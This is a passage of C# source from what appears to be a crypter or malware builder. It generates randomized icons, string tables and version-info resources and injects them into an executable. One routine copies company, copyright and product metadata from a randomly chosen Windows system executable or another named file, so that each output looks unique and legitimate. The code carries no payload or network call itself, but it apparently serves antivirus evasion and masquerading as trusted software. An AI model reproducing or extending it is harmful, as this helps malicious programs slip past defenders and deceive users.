	        0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00,
	        0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01,
	        0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00,
	        0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00,
	        0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00,
	        0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01,
	        0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01,
	        0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,
	        0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01,
	        0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01,
	        0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01,
	        0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
	        0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01,
	        0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01,
	        0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
	        0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00,
	        0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01,
	        0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
	        0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,
	        0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01,
	        0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00,
	        0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01,
	        0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00,
	        0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	        0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01,
	        0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01,
	        0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01,
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        #endregion

        #region str_table


        private static CultureInfo generateRandomCulture()
        {
            CultureInfo[] cultures = CultureInfo.GetCultures(CultureTypes.AllCultures);
            int i = R.Next(0, cultures.Length);
            return cultures[i];
        }

        private static string formatCultureName(CultureInfo cc)
        {
            string name = cc.EnglishName;
            int index = name.IndexOf(" ");
            if (index != -1)
                name = name.Remove(index);
            return name.ToUpper();
        }

        public static ushort MAKELANGID(CultureInfo cc)
        {
            int pid = ((ushort)cc.LCID) & 0x3ff;
            int sid = ((ushort)cc.LCID) >> 10;
            ushort languageID = (ushort)((((ushort)pid) << 10) | ((ushort)sid));
            return languageID;
        }

        static string[] strTableFormat = new string[]
        {
               "STRINGTABLE",
               "LANGUAGE {0}, 0x{1}",
               "{",
               "}"
        };

        #endregion

        private struct IconFormat
        {
            public byte[] Icon;
            public string IconName;
            public string IconScript;
        }

        private static IconFormat GenRandIcon()
        {
            // generate icon file
            // generate script file -> [NAME] ICON "path.ico"

            IconFormat ico_format = new IconFormat();

            byte[] ico = new byte[icon_data.Length];
            byte[] addition = new byte[R.Next(1024, 4096)];
            Buffer.BlockCopy(icon_data, 0, ico, 0, ico.Length);

            for (int i = 0; i < addition.Length; i++)
                addition[i] = (byte)R.Next(1, 250);

            int org_len = ico.Length;
            Array.Resize(ref ico, ico.Length + addition.Length);
            Buffer.BlockCopy(addition, 0, ico, org_len, addition.Length);

            ico_format.Icon = ico;
            ico_format.IconName = GenString(3, 8);
            ico_format.IconScript = String.Format("{0} ICON \"{0}.ico\"", ico_format.IconName);

            return ico_format;
        }

        private static int Counter;

        private static string GenerateRandStringTable()
        {
            StringBuilder sb = new StringBuilder();
            CultureInfo culture = generateRandomCulture();

            sb.AppendLine(strTableFormat[0]);
            sb.AppendLine(String.Format(strTableFormat[1], "0x" + culture.LCID.ToString("X4"), ++Counter));
            sb.AppendLine(strTableFormat[2]);

            int strCount = R.Next(4, 20);
            int randomCount = R.Next(2001, 9999);

            for (int x = 0; x < strCount; x++)
            {
                int wordCount = R.Next(3, 7);

                string line_prefix = "{0},\t\"";
                string line_suffix = "\"";

                sb.Append(String.Format(line_prefix, randomCount++));

                for (int j = 0; j < wordCount; j++)
                {
                    sb.Append(GenString(4, 12));
                    if (j != wordCount - 1)
                        sb.Append(" ");
                }

                sb.Append(line_suffix);
                sb.AppendLine();
            }

            sb.AppendLine(strTableFormat[3]);

            return sb.ToString();
        }

        private static string CloneVersionInfo(string CloneName)
        {
            FileVersionInfo FVI = ExtractVersionInfoInFile(CloneName);

            string VI_Template = Properties.Resources.version_info;

            VI_Template = VI_Template.Replace("[HEX_32]", R.Next(0, Int32.MaxValue).ToString("X8"));

            VI_Template = VI_Template.Replace("[FILEVERSION_COMMA]", String.Format("{0}.{1}.{2}.{3}", FVI.FileMajorPart, FVI.FileMinorPart, FVI.FilePrivatePart, FVI.FileBuildPart));
            VI_Template = VI_Template.Replace("[PRODUCTVERSION_COMMA]", String.Format("{0}.{1}.{2}.{3}", FVI.ProductMajorPart, FVI.ProductMinorPart, FVI.ProductPrivatePart, FVI.ProductBuildPart));

            VI_Template = VI_Template.Replace("[COPYRIGHT]", FVI.LegalCopyright);
            VI_Template = VI_Template.Replace("[COMPANYNAME]", FVI.CompanyName);
            VI_Template = VI_Template.Replace("[FILEDESCRIPTION]", FVI.FileDescription);
            VI_Template = VI_Template.Replace("[INTERNALNAME]", FVI.InternalName);
            VI_Template = VI_Template.Replace("[ORIGFILENAME]", FVI.OriginalFilename);
            VI_Template = VI_Template.Replace("[PRODUCTNAME]", FVI.ProductName);

            return VI_Template;
        }

        private static string RandomizeVPatcher(string Input)
        {
            string ver = GenVersionPeriod();

            string[] var_SysFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86)).Where(S => Path.GetExtension(S) == ".exe").ToArray();
            string var_SysFile = var_SysFiles[R.Next(0, var_SysFiles.Length)];

            FileVersionInfo fvi = FileVersionInfo.GetVersionInfo(var_SysFile);

            Input = Input.Replace("[FileVersion]", fvi.FileVersion);
            Input = Input.Replace("[Description]", fvi.FileDescription);
            Input = Input.Replace("[Copyright]", fvi.LegalCopyright);
            Input = Input.Replace("[Company]", fvi.CompanyName);
            Input = Input.Replace("[ProductName]", fvi.ProductName);
            Input = Input.Replace("[ProductVersion]", fvi.ProductVersion);

            return Input;
        }

        private static string GenerateRandVersionInfo(string FileName)
        {
            string VI_Template = Properties.Resources.version_info;

            string ver_product_period = GenVersionPeriod();
            string ver_product_comma = ver_product_period.Replace(".", ",");

            string ver_file_period = GenVersionPeriod();
            string ver_file_comma = ver_file_period.Replace(".", ",");

            VI_Template = VI_Template.Replace("[FILEVERSION_COMMA]", ver_file_comma);
            VI_Template = VI_Template.Replace("[PRODUCTVERSION_COMMA]", ver_product_comma);

            VI_Template = VI_Template.Replace("[HEX_32]", R.Next(0, Int32.MaxValue).ToString("X8"));

            VI_Template = VI_Template.Replace("[COPYRIGHT]", GenString(1, 6));
            VI_Template = VI_Template.Replace("[COMPANYNAME]", GenString(1, 6));
            VI_Template = VI_Template.Replace("[FILEDESCRIPTION]", GenString(1, 6));
            VI_Template = VI_Template.Replace("[FILEVERSION]", ver_file_period);
            VI_Template = VI_Template.Replace("[PRODUCTVERSION]", ver_product_period);
            VI_Template = VI_Template.Replace("[INTERNALNAME]", FileName);
            VI_Template = VI_Template.Replace("[ORIGFILENAME]", FileName);

            //VI_Template = VI_Template.Replace("[FILEDESCRIPTION]", GenString(4, 10));
            VI_Template = VI_Template.Replace("[FILEVERSION]", ver_file_period);
            VI_Template = VI_Template.Replace("[PRODUCTVERSION]", ver_product_period);

            VI_Template = VI_Template.Replace("[INTERNALNAME]", GenString(4, 10));
            VI_Template = VI_Template.Replace("[ORIGFILENAME]", GenString(4, 10));
            VI_Template = VI_Template.Replace("[PRODUCTNAME]", GenString(1, 6));

            VI_Template = VI_Template.Replace("[LANG]", "0x00");// + langIds[R.Next(0, langIds.Length)].ToString("X4"));
            VI_Template = VI_Template.Replace("[CHARSET]", "0x00");// + charSets[R.Next(0, charSets.Length)].ToString("X4"));

            return VI_Template;
        }
    }

    public class IconInjector
    {

        [DllImport("kernel32.dll", SetLastError = true)]

        static extern int UpdateResource(IntPtr hUpdate, uint lpType, uint lpName, ushort wLanguage, byte[] lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr BeginUpdateResource(string pFileName,
            [MarshalAs(UnmanagedType.Bool)]bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        public static void InjectIcon(string execFileName, string iconFileName)
        {
            InjectIcon(execFileName, iconFileName, 1, 1);
        }

        static void InjectIcon(string execFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
        {
            const uint RT_ICON = 3;
            const uint RT_GROUP_ICON = 14;

            IconFile iconFile = new IconFile();
            iconFile.Load(iconFileName);

            IntPtr hUpdate = BeginUpdateResource(execFileName, false);

            byte[] data = iconFile.CreateIconGroupData(iconBaseID);
            UpdateResource(hUpdate, RT_GROUP_ICON, iconGroupID, 0, data, (uint)data.Length);

            for (int i = 0; i < iconFile.GetImageCount(); i++)
            {
                byte[] image = iconFile.GetImageData(i);
                UpdateResource(hUpdate, RT_ICON, (uint)(iconBaseID + i), 0, image, (uint)image.Length);
            }

            EndUpdateResource(hUpdate, false);
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ICONDIR
    {
        public ushort idReserved;
        public ushort idType;
        public ushort idCount;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ICONDIRENTRY
    {
        public byte bWidth;
        public byte bHeight;
        public byte bColorCount;
        public byte bReserved;
        public ushort wPlanes;
        public ushort wBitCount;
        public uint dwBytesInRes;
        public uint dwImageOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BITMAPINFOHEADER
    {
        public uint biSize;
        public int biWidth;
        public int biHeight;
        public ushort biPlanes;
        public ushort biBitCount;
        public uint biCompression;
        public uint biSizeImage;
        public int biXPelsPerMeter;
        public int biYPelsPerMeter;
        public uint biClrUsed;
        public uint biClrImportant;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 2)]
    public struct GRPICONDIRENTRY
    {
        public byte bWidth;
        public byte bHeight;
        public byte bColorCount;
        public byte bReserved;
        public ushort wPlanes;
        public ushort wBitCount;
        public uint dwBytesInRes;
        public ushort nID;
    }

    public class IconFile
    {
        ICONDIR _iconDir = new ICONDIR();
        ArrayList _iconEntry = new ArrayList();
        ArrayList _iconImage = new ArrayList();

        public IconFile() { }

        public int GetImageCount()
        {
            return _iconDir.idCount;
        }

        public byte[] GetImageData(int index)
        {
            Debug.Assert(0 <= index && index < GetImageCount());
            return (byte[])_iconImage[index];
        }

        public unsafe void Load(string fileName)
        {
            FileStream fs = null;
            BinaryReader br = null;
            byte[] buffer = null;

            try
            {

                fs = new FileStream(fileName, FileMode.Open, FileAccess.Read);
                br = new BinaryReader(fs);

                buffer = br.ReadBytes(sizeof(ICONDIR));
                fixed (ICONDIR* ptr = &_iconDir)
                {
                    Marshal.Copy(buffer, 0, (IntPtr)ptr, sizeof(ICONDIR));
                }

                for (int i = 0; i < _iconDir.idCount; i++)
                {
                    ICONDIRENTRY entry = new ICONDIRENTRY();
                    buffer = br.ReadBytes(sizeof(ICONDIRENTRY));
                    ICONDIRENTRY* ptr = &entry;
                    {
                        Marshal.Copy(buffer, 0, (IntPtr)ptr, sizeof(ICONDIRENTRY));
                    }

                    _iconEntry.Add(entry);
                }

                for (int i = 0; i < _iconDir.idCount; i++)
                {
                    fs.Position = ((ICONDIRENTRY)_iconEntry[i]).dwImageOffset;
                    byte[] img = br.ReadBytes((int)((ICONDIRENTRY)_iconEntry[i]).dwBytesInRes);
                    _iconImage.Add(img);
                }

                byte[] b = (byte[])_iconImage[0];

            }
            catch (Exception) { }
            finally
            {
                if (br != null)
                {
                    br.Close();
                }
                if (fs != null)
                {
                    fs.Close();
                }
            }
        }

        unsafe int SizeOfIconGroupData()
        {
            return sizeof(ICONDIR) + sizeof(GRPICONDIRENTRY) * GetImageCount();
        }

        public unsafe byte[] CreateIconGroupData(uint nBaseID)
        {
            byte[] data = new byte[SizeOfIconGroupData()];

            fixed (ICONDIR* ptr = &_iconDir)
            {
                Marshal.Copy((IntPtr)ptr, data, 0, sizeof(ICONDIR));
            }

            int offset = sizeof(ICONDIR);

            for (int i = 0; i < GetImageCount(); i++)
            {
                GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
                BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();

                BITMAPINFOHEADER* ptr = &bitmapheader;
                {
                    Marshal.Copy(GetImageData(i), 0, (IntPtr)ptr, sizeof(BITMAPINFOHEADER));
                }

                grpEntry.bWidth = ((ICONDIRENTRY)_iconEntry[i]).bWidth;
                grpEntry.bHeight = ((ICONDIRENTRY)_iconEntry[i]).bHeight;
                grpEntry.bColorCount = ((ICONDIRENTRY)_iconEntry[i]).bColorCount;
                grpEntry.bReserved = ((ICONDIRENTRY)_iconEntry[i]).bReserved;
                grpEntry.wPlanes = bitmapheader.biPlanes;
                grpEntry.wBitCount = bitmapheader.biBitCount;
                grpEntry.dwBytesInRes = ((ICONDIRENTRY)_iconEntry[i]).dwBytesInRes;
                grpEntry.nID = (ushort)(nBaseID + i);

                GRPICONDIRENTRY* ptr2 = &grpEntry;
                {
                    Marshal.Copy((IntPtr)ptr2, data, offset, Marshal.SizeOf(grpEntry));
                }

                offset += sizeof(GRPICONDIRENTRY);
            }

            return data;
        }
    }
}